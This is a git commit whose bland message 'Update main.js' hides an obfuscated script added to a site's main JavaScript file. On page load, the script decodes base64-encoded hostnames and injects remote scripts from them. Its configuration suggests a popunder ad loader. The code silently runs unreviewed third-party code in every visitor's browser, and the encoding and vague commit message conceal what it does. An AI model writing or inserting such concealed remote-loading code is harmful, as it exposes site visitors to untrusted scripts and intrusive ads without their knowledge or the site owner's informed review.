6a9e59a1a1ad8723d6f0f7ededcca06ac00486e0
willo <153154914+willowastaken@users.noreply.github.com>
2024-10-02 21:42:31 -0500

    Update main.js

--- js/main.js
+++ js/main.js
@@ -1,1 +1,49 @@
+window.onload = function() {
+    /*<![CDATA[/* */
+    (function(){
+        var o = window,
+            s = "ab25380497850d94244ec7999c15e5e3",
+            k = [
+                ["siteId", 263 + 840 * 357 + 4839225],
+                ["minBid", 0],
+                ["popundersPerIP", "0"],
+                ["delayBetween", 0],
+                ["default", false],
+                ["defaultPerDay", 0],
+                ["topmostLayer", "auto"]
+            ],
+            b = [
+                "d3d3LnZpc2FyaW9tZWRpYS5jb20vcm4vcGtkbS9wcGl4aS5taW4uanM=",
+                "ZDEzazdwcmF4MXlpMDQuY2xvdWRmcm9udC5uZXQvemN0YS5taW4uanM="
+            ],
+            c = -1,
+            w, i,
+            q = function(){
+                clearTimeout(i);
+                c++;
+                if (b[c] && !(1753842684000 < (new Date).getTime() && 1 < c)) {
+                    w = o.document.createElement("script");
+                    w.type = "text/javascript";
+                    w.async = true;
+                    var l = o.document.getElementsByTagName("script")[0];
+                    w.src = "https://" + atob(b[c]);
+                    w.crossOrigin = "anonymous";
+                    w.onerror = q;
+                    w.onload = function(){
+                        clearTimeout(i);
+                        o[s.slice(0, 16) + s.slice(0, 16)] || q();
+                    };
+                    i = setTimeout(q, 5000);
+                    l.parentNode.insertBefore(w, l);
+                }
+            };
+        if (!o[s]) {
+            try {
+                Object.freeze(o[s] = k);
+            } catch (e) {}
+            q();
+        }
+    })();
+    /*]]>/* */
+};
 
